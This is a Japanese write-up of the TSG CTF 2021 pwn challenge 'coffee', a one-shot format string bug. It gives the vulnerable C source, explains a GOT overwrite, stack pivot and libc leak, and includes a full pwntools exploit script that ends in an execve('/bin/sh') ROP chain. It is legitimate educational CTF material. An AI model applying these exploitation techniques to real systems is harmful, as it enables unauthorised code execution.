---
layout: chall
ctf_name: TSG CTF 2021
problem_name: coffee
genre: pwn
solved_date: 2021-12-18
during_ctf: false
tag: [fsb, rop, fav]
---

## 概要

FSB があるが、一度しかできない(+文字数制限 160 文字)

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>コード</summary>

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

</details>


## 解法

FSB で AAW ができるので、puts に RSP をズラすガジェットを置く。`add rsp, 0x08` 等が使えそうに見えるが、FSB をするためには先頭にFSB 用の文字列を置かなければいけない（FSB ペイロードの前にnull バイトが入ってはいけないので）。
RSP を `0x38` ズラすガジェットがあるので、ズラしきれるだけの FSB のペイロードを作り、その後に ROP のペイロードを置く。

```
0x00401286: add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
```

書き込める量が限られているので、一旦別のセクションに scanf で書き込んでからそこに pivot する ROP を書く。scanf のアドレスには空白文字があるため直接呼べないが、main の scanf を呼び出している場所に飛ばせば任意アドレスに書き込みができる。

その後は execve する ROP を書き込んで終わり。

<details><summary>スクリプト</summary>

```py
from pwn import *

BIN_NAME = 'coffee'
REMOTE_ADDR = 'hogenet'
REMOTE_LIBC_PATH = 'libc-2.31.so'
REMOTE_PORT = 3141592
LOCAL = True

chall = ELF(BIN_NAME)
context.binary = chall

ROP_RET = 0x0040101a

ROP_POP_RSP_POP_R13_POP_R14_POP_R15_RET = 0x0040128d
ROP_ADD_RSP_0X38_RET = 0x00401286
ROP_ADD_RSP_8_RET = 0x00401016

ROP_POP_RDI_RET = 0x00401293
ROP_POP_RSI_POP_R15_RET = 0x00401291

ROP_MOV_RDI_p159s_CALL_PRINTF = 0x004011be

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

spaces = [b'\x20', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d']

def write_rop_with_stager(rop):
    if len(rop) == -1: return
    payload  = b'%29$p'
    payload += fmtstr_payload(
        6 + len(payload) // 8,
        { chall.got["puts"]: ROP_ADD_RSP_0X38_RET },
        write_size="short",
        numbwritten=14,
        offset_bytes=len(payload) % 8
    )
    print(f'{hex(len(payload))=}')
    assert(len(payload) <= 0x30)
    payload += b'A' * (0x30 - len(payload))
    payload += b''.join([p64(x) for x in rop])
    assert(all(c not in payload for c in spaces))
    assert(len(payload) < 160)
    stream.sendline(payload)

def write_rop(rop):
    if len(rop) == -1: return
    payload  = b''
    payload += b''.join([p64(x) for x in rop])
    assert(all(c not in payload for c in spaces))
    assert(len(payload) < 160)
    stream.sendline(payload)

PIVOT_POS = 0x404100
write_rop_with_stager([
    # write rop
    ROP_POP_RSI_POP_R15_RET,
    PIVOT_POS,
    0, 
    ROP_MOV_RDI_p159s_CALL_PRINTF,
    0, 0, 0, 0, 0, 0, # for puts call
    # stack pivot
    ROP_POP_RSP_POP_R13_POP_R14_POP_R15_RET,
    PIVOT_POS
])

addr_start_main_hex = stream.recv(14)
print(f'{addr_start_main_hex=}')
addr_start_main = int(addr_start_main_hex[2:], 16)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so' if LOCAL else REMOTE_LIBC_PATH)
libc.address = addr_start_main - 159923

print(f'{hex(libc.address)=}')

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh')), 0)
payload = rop.chain()

write_rop([
    0, 0, 0, 
] + unpack_many(payload))

stream.recvuntil("b", timeout=1)
stream.interactive()
```

</details>

